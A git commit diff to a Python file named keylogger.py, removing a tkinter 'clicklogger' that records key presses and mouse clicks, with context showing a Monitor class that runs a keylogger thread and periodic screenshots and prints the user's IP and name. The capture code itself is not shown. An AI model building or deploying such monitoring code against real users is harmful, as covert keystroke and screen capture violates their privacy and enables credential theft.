bdc79ac24099b34d711f1a9ef4899da4d819eed2
Dahveyea <dahveyea.cowan@gmail.com>
2019-10-18 22:11:27 -0700

    Removed Clicklogger

--- keylogger.py
+++ keylogger.py
@@ -4,7 +4,6 @@ import os
 import random
 import requests
 import socket
-import tkinter as tkr
 
 
 from threading import Timer, Thread
@@ -22,10 +21,6 @@ print(privateIP)
 print(user)
 print(datetime)
 
-
-Log = []
-
-master = tkr.Tk()
 
 
 class IntervalTimer(Timer):
@@ -58,29 +53,6 @@ class Monitor:
         self._build_logs()
         Thread(target=self._keylogger).start()
         IntervalTimer(interval, self._screenshot).start()
-
-def char(event):
-    print("pressed", repr(event.char))
-    key1 = event.char
-    Log.append(key1)
-    print(Log)
-
-def click(event):
-    frame.focus_set()
-    print("clicked at", event.x,event.y)
-    key2 = event.x,event.y
-    Log.append(key2)
-    print(Log)
-
-
-frame = tkr.Frame(master,height=500,width=500)
-frame.bind("<Key>",char)
-frame.bind("<Button-1>",click)
-frame.bind("<Button-2>",click)
-frame.bind("<Button-3>",click)
-frame.pack()
-
-master.mainloop()
 
 
 if __name__ == '__main__':
